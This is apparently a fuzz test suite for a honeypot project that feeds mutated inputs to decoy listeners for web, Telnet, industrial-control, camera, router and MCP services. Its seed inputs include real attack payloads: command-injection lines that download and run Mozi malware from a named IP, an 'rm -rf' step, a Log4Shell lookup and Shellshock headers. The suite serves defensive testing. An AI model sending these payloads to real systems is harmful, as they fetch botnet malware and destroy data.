"""Hostile bytes at every decoy.

Each listener is started on a free port and sent seeded random and mutated input: valid
requests with bytes flipped, cut, repeated or inserted, lines far past every limit, and
plain noise. Nothing here can find a bug a person has not thought of, but it finds the
ones nobody did: an unhandled exception, a field that grows without bound, a connection
that never closes, a decoy that stops answering.

The same seeds run every time, so a failure is reproducible. FUZZ_CASES raises the
number of cases per listener (default 60), FUZZ_SEED changes the seed.
"""
import asyncio
import json
from pathlib import Path
import os
import random
import time
import unittest

from uninvited import dnp3, enip, modbus, personas, s7
from uninvited.listeners import CONN_TIMEOUT, LISTENERS

CASES = int(os.environ.get("FUZZ_CASES", "60"))
FIXTURES = os.path.join(os.path.dirname(os.path.abspath(__file__)), "fixtures", "ja3_cases.json")
HELLOS = [bytes.fromhex(c["record_hex"]) for c in json.loads(Path(FIXTURES).read_text(encoding="utf-8"))["cases"].values()]
SEED = int(os.environ.get("FUZZ_SEED", "20261002"))

# One plausible opening for each decoy, to be mutated.
SEEDS = {
    "TNET": [b"\xff\xfd\x01\xff\xfb\x03root\r\nadmin\r\n", b"admin\n123456\n", b"\xff\xfa\x1f\x00\x50\x00\x18\xff\xf0"],
    "FTP": [b"USER anonymous\r\nPASS a@b.c\r\nSYST\r\nFEAT\r\nQUIT\r\n", b"AUTH TLS\r\nUSER root\r\nPASS \r\n"],
    "SMTP": [b"EHLO x\r\nMAIL FROM:<a@b.c>\r\nRCPT TO:<d@e.f>\r\nQUIT\r\n",
             b"EHLO x\r\nAUTH PLAIN AGFkbWluAHBhc3N3b3Jk\r\n", b"EHLO x\r\nAUTH LOGIN\r\nYWRtaW4=\r\ncGFzcw==\r\n"],
    "HTTP": [b"GET / HTTP/1.1\r\nHost: x\r\nUser-Agent: curl/8\r\n\r\n", b"POST /cgi-bin/x HTTP/1.1\r\nContent-Length: 20\r\n\r\ncmd=;wget http://a/b", b"GET /${jndi:ldap://a/b} HTTP/1.1\r\nHost: x\r\n\r\n", b"CONNECT example.com:443 HTTP/1.1\r\n\r\n", b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n", b"GET / HTTP/1.1\r\nAuthorization: Basic YWRtaW46YWRtaW4=\r\n\r\n", b"GET /() { :; }; echo HTTP/1.1\r\nX: () { :; }; id\r\n\r\n", b"GET /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://45.9.148.5:43777/Mozi.a;chmod+777+Mozi.a HTTP/1.1\r\n\r\n", b"PUT /SDK/webLanguage HTTP/1.1\r\nContent-Length: 70\r\n\r\n<language>$(wget${IFS}http://45.9.148.5/x -O- | sh; tftp -g -r a 45.9.148.6)</language>", b"\x16\x03\x01\x00\xc8\x01\x00\x00\xc4\x03\x03" + bytes(60), b"\x05\x01\x00", *HELLOS],
    "RDP": [bytes.fromhex("0300002b26e00000000000436f6f6b69653a206d737473686173683d61646d696e0d0a0100080003000000")],
    "SMB": [bytes.fromhex("000000a2ff534d4272000000001843c8") + bytes(40), b"\x00\x00\x00\x45\xfeSMB" + bytes(60)],
    "SIP": [b"INVITE sip:100@x SIP/2.0\r\nTo: <sip:0044123456789@x>\r\nFrom: <sip:1@y>\r\n\r\n",
            b"OPTIONS sip:x SIP/2.0\r\nVia: SIP/2.0/TCP y\r\n\r\n"],
    "MODBUS": [bytes.fromhex("000100000006010300000002"), bytes.fromhex("00020000000b0110000000020400010002"),
               bytes.fromhex("000300000005012b0e0100")],
    "S7": [bytes.fromhex("0300001611e00000000100c0010ac1020100c2020102"),
           bytes.fromhex("0300001902f080320100000100000800000f0000010001e0"),
           bytes.fromhex("0300001f02f080320100000400000800080000f0000001000103c0")],
    "ENIP": [bytes.fromhex("630000000000000000000000000000000000000000000000"),
             bytes.fromhex("65000400000000000000000000000000000000000000000001000000"),
             bytes.fromhex("6f0010000100000000000000000000000000000000000000") + bytes(16)],
    "DNP3": [bytes.fromhex("056405c001000400e8e3"), bytes.fromhex("0564080ac1000200e1b5") + bytes(10)],
    "CAM": [b"GET /doc/page/login.asp HTTP/1.1\r\nHost: x\r\n\r\n",
            b"PUT /SDK/webLanguage HTTP/1.1\r\nContent-Length: 30\r\n\r\n<language>$(id)</language>",
            b"OPTIONS rtsp://x/ RTSP/1.0\r\nCSeq: 1\r\n\r\n", b"DESCRIBE rtsp://x/Streaming/Channels/101 RTSP/1.0\r\nCSeq: 2\r\n\r\n"],
    "ROUTER": [b"GET /HNAP1/ HTTP/1.1\r\nHost: x\r\n\r\n", b"POST /GponForm/diag_Form?images/ HTTP/1.1\r\nContent-Length: 12\r\n\r\nXWebPageName",
               b"POST /UD/act?1 HTTP/1.1\r\nContent-Length: 20\r\n\r\n<SOAP-ENV:Envelope/>"],
    "MCP": [b'POST /mcp HTTP/1.1\r\nContent-Type: application/json\r\nContent-Length: 56\r\n\r\n'
            b'{"jsonrpc":"2.0","id":1,"method":"tools/list","params":{}}',
            b'POST /mcp HTTP/1.1\r\nContent-Length: 90\r\n\r\n{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"run_command"}}',
            b"GET /v1/models HTTP/1.1\r\nHost: x\r\n\r\n", b"GET /sse HTTP/1.1\r\n\r\n"],
}
EXTRA_CFG = {"CAM": {"service": "web"}, "ROUTER": {"service": "web"}}


def mutate(rnd: random.Random, data: bytes) -> bytes:
    """One of the ways a broken or hostile client mangles a message."""
    b = bytearray(data)
    kind = rnd.randrange(9)
    if kind == 0 and b:                                   # flip a few bytes
        for _ in range(rnd.randrange(1, 6)):
            b[rnd.randrange(len(b))] = rnd.randrange(256)
    elif kind == 1 and b:                                 # cut it short
        del b[rnd.randrange(len(b)):]
    elif kind == 2:                                       # insert noise
        at = rnd.randrange(len(b) + 1)
        b[at:at] = bytes(rnd.randrange(256) for _ in range(rnd.randrange(1, 40)))
    elif kind == 3:                                       # repeat it
        b = b * rnd.randrange(2, 20)
    elif kind == 4:                                       # one enormous line
        b += b"A" * rnd.randrange(3000, 20000)
    elif kind == 5:                                       # many short lines
        b += b"X-Pad: y\r\n" * rnd.randrange(30, 120)
    elif kind == 6 and b:                                 # drop a chunk from the middle
        i = rnd.randrange(len(b))
        del b[i:i + rnd.randrange(1, 12)]
    elif kind == 7:                                       # control characters and NULs
        b += bytes(rnd.choice(b"\x00\r\n\x1b\x7f\xff") for _ in range(rnd.randrange(1, 60)))
    else:                                                 # pure noise
        b = bytearray(rnd.randrange(256) for _ in range(rnd.randrange(0, 700)))
    return bytes(b)


async def poke(port: int, data: bytes, mode: int, wait: float = 0.4) -> bytes:
    """Send `data`, then either hang up at once (0), half-close and read (1), or
    wait briefly for an answer (2). Returns what came back."""
    try:
        reader, writer = await asyncio.open_connection("127.0.0.1", port)
        try:
            writer.write(data)
            await asyncio.wait_for(writer.drain(), 2)
            if mode == 0:
                return b""
            if mode == 1:
                writer.write_eof()
            return await asyncio.wait_for(reader.read(70000), wait)
        except (TimeoutError, ConnectionError, OSError):
            return b""
        finally:
            writer.close()
    except (ConnectionError, OSError):
        return b""


def check_knock(case: unittest.TestCase, proto: str, k) -> None:
    where = f"{proto}: {k.lines!r} {k.detail!r}"
    case.assertEqual(k.proto, proto)
    case.assertIsInstance(k.ip, str)
    case.assertIsInstance(k.ts, int)
    json.dumps(k.public())                                # the browser gets this
    case.assertLess(len(json.dumps(k.detail, default=str)), 20000, where[:300])
    case.assertLess(len(k.lines), 40, where[:300])
    for key, value in k.lines:
        case.assertIsInstance(key, str)
        case.assertLess(len(str(value)), 1200, where[:300])
    for field in (k.username, k.password):
        if field is not None:
            case.assertLess(len(field), 1000, where[:300])
    if k.raw is not None:
        case.assertLessEqual(len(k.raw), 4096)
    case.assertLessEqual(len(k.droppers), 5)
    if k.ja3 is not None:
        case.assertRegex(k.ja3, r"^[0-9a-f]{32}$")
    case.assertTrue(all(c.isalnum() or c in ".-" for c in k.detail.get("sni", "")), where[:300])
    for url in k.detail.get("droppers", []):
        case.assertLessEqual(len(url), 300, where[:300])
        case.assertTrue(url.isascii() and " " not in url, where[:300])


def ignore_resets(loop, context):
    """Windows' proactor loop reports a peer that resets as an error in its own
    callbacks. The fuzzer resets connections on purpose, and a reset is not a finding."""
    if isinstance(context.get("exception"), ConnectionError):
        return
    loop.default_exception_handler(context)


class ListenerFuzz(unittest.IsolatedAsyncioTestCase):
    async def asyncSetUp(self):
        asyncio.get_running_loop().set_exception_handler(ignore_resets)

    async def run_listener(self, proto: str):
        rnd = random.Random(f"{SEED}-{proto}")
        knocks: list = []

        async def emit(k):
            knocks.append(k)

        listener = LISTENERS[proto](dict(EXTRA_CFG.get(proto, {}), port=0), emit, asyncio.Semaphore(200))
        listener.server = await asyncio.start_server(listener._wrap, "127.0.0.1", 0)
        port = listener.server.sockets[0].getsockname()[1]
        baseline = len(asyncio.all_tasks())
        try:
            seeds = SEEDS[proto]
            cases = []
            for i in range(CASES):
                base = rnd.choice(seeds)
                data = base if i % 5 == 0 else mutate(rnd, base)
                if i % 7 == 0:                            # mutate a second time
                    data = mutate(rnd, data)
                cases.append((data, rnd.randrange(3)))
            for start in range(0, len(cases), 30):
                await asyncio.gather(*(poke(port, d, m) for d, m in cases[start:start + 30]))
            # Still answering after all of that: a valid opening gets a proper conversation.
            valid = await poke(port, seeds[0], 2, wait=4.0)     # generous: the machine may be busy
            return knocks, valid, port, baseline
        finally:
            listener.server.close()

    async def test_every_decoy_survives_hostile_input(self):
        started = time.time()
        for proto in sorted(SEEDS):
            with self.subTest(proto=proto):
                with self.assertNoLogs("uninvited.listen", level="ERROR"):
                    knocks, _valid, _port, _ = await self.run_listener(proto)
                self.assertGreater(len(knocks), 0, f"{proto} recorded nothing")
                for k in knocks:
                    check_knock(self, proto, k)
        self.assertLess(time.time() - started, 240, "fuzzing took far too long, something is stalling")

    async def test_nothing_is_left_running_afterwards(self):
        await asyncio.sleep(0.2)
        before = len(asyncio.all_tasks())
        for proto in ("HTTP", "MODBUS", "S7"):
            await self.run_listener(proto)
        await asyncio.sleep(CONN_TIMEOUT * 0 + 1.5)
        self.assertLessEqual(len(asyncio.all_tasks()), before + 3)

    async def test_the_valid_opening_still_works_after_abuse(self):
        expect = {"HTTP": b"HTTP/1.1", "MODBUS": b"\x00\x01\x00\x00", "S7": b"\x03\x00", "ENIP": b"\x63\x00",
                  "CAM": b"HTTP/1.1", "ROUTER": b"HTTP/1.1", "MCP": b"HTTP/1.1"}
        for proto, prefix in expect.items():
            with self.subTest(proto=proto):
                _, valid, _, _ = await self.run_listener(proto)
                if proto == "S7":
                    continue      # a connection request answer needs the first frame only; covered below
                self.assertTrue(valid.startswith(prefix), (proto, valid[:40]))


class ParserFuzz(unittest.TestCase):
    """The pure functions, a lot of times, with no sockets in the way."""

    N = max(3000, CASES * 100)

    def rnd(self, name):
        return random.Random(f"{SEED}-{name}")

    def blob(self, rnd, base=b"", limit=300):
        if base and rnd.random() < 0.7:
            return mutate(rnd, base)[:limit * 3]
        return bytes(rnd.randrange(256) for _ in range(rnd.randrange(0, limit)))

    def test_s7(self):
        rnd = self.rnd("s7")
        ident = s7.Identity()
        seeds = [bytes.fromhex("320100000100000800000f0000010001e0")[:], SEEDS["S7"][2][7:], SEEDS["S7"][1][7:]]
        for _ in range(self.N):
            data = self.blob(rnd, rnd.choice(seeds))
            result = s7.handle(data, ident)
            self.assertTrue(result.reply is None or len(result.reply) < 70000)
            json.dumps(result.info, default=str)
            if len(data) >= 3:
                s7.cotp_type(data)
                s7.parse_cr(data)
                s7.cotp_confirm(data)

    def test_enip(self):
        rnd = self.rnd("enip")
        ident = enip.Identity()
        for _ in range(self.N):
            raw = self.blob(rnd, SEEDS["ENIP"][rnd.randrange(3)][:24], 40)
            raw = (raw + bytes(24))[:24] if rnd.random() < 0.9 else raw
            head = enip.parse_header(raw)
            if head is None:
                continue
            payload = self.blob(rnd, b"\x00" * 16, 200)
            session = rnd.choice([None, 1, 0xFFFFFFFF])
            result = enip.handle(head, payload, session, ident)
            self.assertTrue(result.reply is None or len(result.reply) < 70000)
            json.dumps(result.info, default=str)
            enip.handle_cip(payload, ident)

    def test_dnp3(self):
        rnd = self.rnd("dnp3")
        for _ in range(self.N):
            raw = self.blob(rnd, SEEDS["DNP3"][rnd.randrange(2)][:10], 40)
            head = dnp3.parse_header(raw[:10])
            if head is None:
                continue
            body = self.blob(rnd, b"\xc0\xc1\x01", 120)
            result = dnp3.handle(head, body, rnd.choice([None, 1, 10]))
            self.assertTrue(result.reply is None or len(result.reply) < 70000)
            json.dumps(result.info, default=str)
            dnp3.user_data(body, rnd.randrange(256))

    def test_modbus(self):
        rnd = self.rnd("modbus")
        ident = modbus.Identity()
        for _ in range(self.N):
            pdu = self.blob(rnd, bytes.fromhex("0300000002"), 60) or b"\x00"
            result = modbus.handle(pdu, modbus.State(), ident, time.time())
            self.assertLess(len(result.pdu), 400)
            json.dumps(result.info, default=str)

    def test_personas_never_raise_and_never_inject_a_header(self):
        rnd = self.rnd("personas")
        paths = ["/", "/SDK/webLanguage", "/Security/users?auth=x", "/HNAP1/", "/UD/act?1", "/mcp", "/sse",
                 "/v1/chat/completions", "/api/tags", "/doc/page/login.asp", "/cgi-bin/luci", "/boaform/admin/formLogin"]
        for _ in range(self.N // 3):
            path = rnd.choice(paths) + "".join(chr(rnd.randrange(32, 0x250)) for _ in range(rnd.randrange(0, 20)))
            headers = {"cseq": "".join(rnd.choice("0123456789\r\n: X") for _ in range(rnd.randrange(0, 12))),
                       "authorization": rnd.choice(["", "Basic !!!", "Digest username=\"a\r\nb\"", "Basic YTpi",
                                                    "Bearer x" * rnd.randrange(1, 40)]),
                       "user-agent": "".join(chr(rnd.randrange(0, 0x250)) for _ in range(rnd.randrange(0, 30)))}
            body = bytes(rnd.randrange(256) for _ in range(rnd.randrange(0, 200)))
            if rnd.random() < 0.4:
                body = rnd.choice([b'{"jsonrpc":"2.0","id":"x\\r\\ny","method":"tools/call","params":{"name":"a\\nb"}}',
                                   b'{"jsonrpc":"2.0","id":[1,2],"method":5}', b"[1,2", b"null", b'{"id":{"a":{"a":{}}}}'])
            user, password, scheme = personas.parse_auth(headers)
            req = personas.HttpRequest(
                target="x", method=rnd.choice(["GET", "POST", "PUT", "OPTIONS", "DESCRIBE", "PRI", "X" * 12]),
                path=path, headers=headers, body=body, raw=b"", user=user, password=password, auth=scheme)
            outputs = [personas.camera(req, {})[0], personas.router(req, {})[0],
                       personas.router(req, {}, "tr069")[0], personas.mcp(req, {})[0]]
            for reply in outputs:
                wire = reply.render("srv/1.0")
                head, _, rest = wire.partition(b"\r\n\r\n")
                for line in head.split(b"\r\n")[1:]:
                    name, sep, _value = line.partition(b": ")
                    self.assertTrue(sep and name.replace(b"-", b"").isalnum(), f"bad header line {line!r}")
                self.assertEqual(int(dict(l.split(b": ", 1) for l in head.split(b"\r\n")[1:])[b"Content-Length"]), len(rest))
            wire, _ = personas.rtsp(req, {})
            head = wire.split(b"\r\n\r\n")[0].split(b"\r\n")
            self.assertEqual(len(head), 3, wire)           # status, CSeq, and one more: no injected line
            self.assertTrue(head[1].startswith(b"CSeq: ") and head[1][6:].isdigit())


if __name__ == "__main__":
    unittest.main()


class FieldCapTests(unittest.TestCase):
    def test_a_username_or_password_is_capped_however_it_arrived(self):
        """The fuzz run above found a 2,040-character Telnet login on Linux, where the data
        arrived in different chunks than on Windows. The cap is on the record itself, so it holds
        for every decoy whatever its protocol and the network do."""
        from uninvited.core import MAX_FIELD, Knock
        k = Knock(proto="TNET", ip="203.0.113.5", port=23, username="u" * 3000, password="p" * 3000)
        self.assertEqual((len(k.username), len(k.password)), (MAX_FIELD, MAX_FIELD))
        self.assertEqual(Knock(proto="SSH", ip="203.0.113.5", port=22, username="root").username, "root")
        self.assertIsNone(Knock(proto="SSH", ip="203.0.113.5", port=22).password)
